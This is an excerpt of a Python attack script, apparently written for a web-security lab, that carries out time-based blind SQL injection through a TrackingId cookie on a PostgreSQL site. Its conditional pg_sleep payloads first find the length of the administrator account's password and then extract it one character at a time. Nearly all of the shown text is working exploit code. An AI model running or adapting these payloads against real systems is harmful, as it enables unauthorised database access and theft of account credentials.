...
#     payload = tracking_id + "'||(SELECT case when (1=2) then (pg_sleep(10)) else (pg_sleep(0)) end)||'"
...
def get_password_len(session, domain, tracking_id):
    ...
    while True:
        password_len += 1
        payload = tracking_id + "'||(SELECT case when (LENGTH(password)={}) then (pg_sleep(10)) else (pg_sleep(0)) end from users where username='administrator')||'".format(password_len)
        r = session.get(domain, cookies={'TrackingId': payload})
...
def get_password(session, domain, tracking_id, password_len):
    ...
    base_payload = tracking_id + "'||(SELECT case when (SUBSTR(password,{},1)='{}') then (pg_sleep(10)) else (pg_sleep(0)) end from users where username='administrator')||'"
